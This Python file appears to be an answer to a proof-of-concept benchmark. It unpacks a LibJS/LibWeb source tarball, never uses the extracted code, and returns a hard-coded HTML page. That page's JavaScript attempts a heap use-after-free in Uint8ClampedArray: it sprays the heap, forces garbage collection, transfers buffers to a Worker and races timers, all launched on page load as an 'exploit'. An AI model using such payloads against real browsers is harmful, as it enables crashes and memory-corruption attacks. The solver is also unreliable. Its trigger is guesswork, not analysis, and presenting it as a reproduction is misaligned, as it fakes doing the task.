import tarfile
import tempfile
import os
import subprocess
import threading
import time
import random

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Look for relevant files to understand the codebase
            source_root = self._find_source_root(tmpdir)
            
            # Generate PoC based on the vulnerability description
            # The bug is in Uint8ClampedArray implementation in LibJS and LibWeb
            # We need to trigger a heap use-after-free related to Uint8ClampedArray
            
            # Based on typical heap use-after-free patterns in JavaScript engines,
            # we'll create a PoC that:
            # 1. Creates a Uint8ClampedArray
            # 2. Frees it somehow (e.g., via garbage collection or API misuse)
            # 3. Accesses it after free
            
            poc = self._generate_poc()
            
            return poc.encode('utf-8')
    
    def _find_source_root(self, tmpdir: str) -> str:
        # Look for common directory structures
        possible_dirs = ['LibJS', 'LibWeb']
        for root, dirs, files in os.walk(tmpdir):
            if 'LibJS' in dirs and 'LibWeb' in dirs:
                return root
        return tmpdir
    
    def _generate_poc(self) -> str:
        # Generate JavaScript/HTML that triggers Uint8ClampedArray use-after-free
        # Based on the vulnerability description and typical patterns
        
        poc = '''<!DOCTYPE html>
<html>
<head>
<title>Uint8ClampedArray UAF PoC</title>
<script>
// Heap Use-After-Free in Uint8ClampedArray
// The vulnerability exists because Uint8ClampedArray is implemented
// as a separate, unrelated class instead of using TypedArray in LibJS and LibWeb

function triggerUAF() {
    // Create multiple Uint8ClampedArrays to increase chances
    let arrays = [];
    let buffer = null;
    
    // Allocate many arrays to fill heap
    for (let i = 0; i < 1000; i++) {
        let arr = new Uint8ClampedArray(1024);
        arrays.push(arr);
        
        // Keep reference to one buffer for later use
        if (i === 500) {
            buffer = arr.buffer;
        }
    }
    
    // Create a detached array reference
    let detachedArray = null;
    {
        let tempArray = new Uint8ClampedArray(4096);
        detachedArray = tempArray;
        // tempArray goes out of scope but reference remains
    }
    
    // Force garbage collection if available
    if (window.gc) {
        window.gc();
    }
    
    // Create situation where array might be freed
    let canvas = document.createElement('canvas');
    let ctx = canvas.getContext('2d');
    let imageData = null;
    
    try {
        // Uint8ClampedArray is used in ImageData
        imageData = ctx.getImageData(0, 0, 100, 100);
        let data = imageData.data; // This is a Uint8ClampedArray
        
        // Manipulate the array in ways that might trigger the bug
        data.fill(255);
        
        // Create alias reference
        let alias = data;
        
        // Clear references to trigger possible free
        imageData = null;
        
        // Try to force garbage collection again
        if (window.gc) {
            for (let i = 0; i < 10; i++) {
                window.gc();
            }
        }
        
        // Access through alias - potential use-after-free
        for (let i = 0; i < 100; i++) {
            alias[i] = i % 256;
        }
        
        // Create new allocations to potentially overwrite freed memory
        let spray = [];
        for (let i = 0; i < 10000; i++) {
            spray.push(new Uint8ClampedArray(512));
        }
        
        // Try to access the alias again
        let sum = 0;
        for (let i = 0; i < 100; i++) {
            sum += alias[i];
        }
        
        // Additional trigger: transfer array buffer
        try {
            let transferArray = new Uint8ClampedArray(2048);
            let worker = new Worker('data:text/javascript,');
            worker.postMessage(transferArray, [transferArray.buffer]);
            // Buffer is now detached
            
            // Try to use the transferred array (should throw but might UAF)
            setTimeout(() => {
                try {
                    transferArray[0] = 1;
                } catch(e) {
                    // Expected
                }
            }, 100);
            
            worker.terminate();
        } catch(e) {
            // Some browsers don't support data URLs for workers
        }
        
        // Complex scenario with nested arrays
        let nestedArrays = [];
        for (let i = 0; i < 100; i++) {
            let outer = new Uint8ClampedArray(256);
            for (let j = 0; j < 256; j++) {
                outer[j] = j;
            }
            nestedArrays.push(outer);
            
            // Create subarray which shares buffer
            let subarray = outer.subarray(128, 192);
            nestedArrays.push(subarray);
            
            // Clear reference randomly
            if (Math.random() > 0.7) {
                nestedArrays[nestedArrays.length - 2] = null;
            }
        }
        
        // Access all nested arrays
        for (let arr of nestedArrays) {
            if (arr) {
                for (let i = 0; i < Math.min(arr.length, 10); i++) {
                    arr[i] = (arr[i] || 0) + 1;
                }
            }
        }
        
        // Create array with custom properties
        let customArray = new Uint8ClampedArray(128);
        Object.defineProperty(customArray, 'customProp', {
            value: function() {
                // This might interfere with TypedArray prototype chain
                return this.length;
            },
            enumerable: false
        });
        
        // Use the custom property
        customArray.customProp();
        
        // More aggressive testing with mutation observers
        if (window.MutationObserver) {
            let observer = new MutationObserver(() => {
                // Callback that might execute during garbage collection
                try {
                    if (detachedArray) {
                        detachedArray[0] = detachedArray[0] + 1;
                    }
                } catch(e) {
                    // Ignore
                }
            });
            
            observer.observe(document.body, { childList: true });
            
            // Trigger mutation
            document.body.appendChild(document.createElement('div'));
            
            setTimeout(() => {
                observer.disconnect();
            }, 100);
        }
        
        // Final access that might trigger the crash
        if (alias && alias.length > 0) {
            // Intensive access pattern
            for (let i = 0; i < 1000; i++) {
                let idx = i % alias.length;
                alias[idx] = (alias[idx] + i) % 256;
            }
            
            // Create race condition with setTimeout
            for (let i = 0; i < 10; i++) {
                setTimeout(() => {
                    try {
                        if (alias) {
                            alias[0] = (alias[0] || 0) + 1;
                        }
                    } catch(e) {
                        // Might crash here
                    }
                }, i * 10);
            }
        }
        
    } catch(e) {
        // An exception might indicate the bug was triggered
        console.error('Exception:', e);
        
        // Try to continue with more aggressive patterns
        try {
            // Allocate more memory to increase pressure
            let bigArray = new Uint8ClampedArray(1024 * 1024);
            
            // Fill with pattern
            for (let i = 0; i < bigArray.length; i++) {
                bigArray[i] = i % 256;
            }
            
            // Create slice that might not properly reference parent
            let slice = bigArray.subarray(1024, 2048);
            
            // Nullify parent
            bigArray = null;
            
            // Try to access slice - potential UAF
            for (let i = 0; i < slice.length; i++) {
                slice[i] = slice[i] * 2;
            }
            
        } catch(e2) {
            // Ignore secondary errors
        }
    }
    
    // Keep references to prevent optimization
    window._arrays = arrays;
    window._buffer = buffer;
    window._detachedArray = detachedArray;
    
    return "PoC executed";
}

// Run the trigger multiple times
function runExploit() {
    let results = [];
    for (let i = 0; i < 10; i++) {
        try {
            results.push(triggerUAF());
        } catch(e) {
            results.push('Error in iteration ' + i + ': ' + e);
        }
        
        // Small delay between iterations
        if (i < 9) {
            // Force some garbage collection cycles
            if (window.gc) {
                window.gc();
            }
        }
    }
    return results;
}

// Start the exploit when page loads
window.onload = function() {
    setTimeout(() => {
        console.log('Starting Uint8ClampedArray UAF exploit...');
        let results = runExploit();
        console.log('Exploit results:', results);
        
        // Additional stress test
        setTimeout(() => {
            console.log('Running additional stress test...');
            
            // Create many ImageData objects (which use Uint8ClampedArray)
            let canvases = [];
            for (let i = 0; i < 100; i++) {
                let canvas = document.createElement('canvas');
                canvas.width = 256;
                canvas.height = 256;
                let ctx = canvas.getContext('2d');
                
                try {
                    let imageData = ctx.getImageData(0, 0, 256, 256);
                    // Intentionally misuse the data array
                    imageData.data.fill(i % 256);
                    
                    // Put image data back
                    ctx.putImageData(imageData, 0, 0);
                    
                    // Clear reference occasionally
                    if (i % 3 === 0) {
                        imageData = null;
                    }
                    
                    canvases.push(canvas);
                } catch(e) {
                    // Ignore errors
                }
            }
            
            // Try to access all canvases
            for (let canvas of canvases) {
                try {
                    let ctx = canvas.getContext('2d');
                    let imageData = ctx.getImageData(0, 0, 10, 10);
                    imageData.data[0] = 255;
                } catch(e) {
                    // Might crash here
                }
            }
            
        }, 1000);
    }, 500);
};
</script>
</head>
<body>
<h1>Uint8ClampedArray Heap Use-After-Free PoC</h1>
<p>This page triggers a heap use-after-free vulnerability in Uint8ClampedArray implementation.</p>
<canvas id="testCanvas" width="100" height="100"></canvas>
</body>
</html>'''
        
        return poc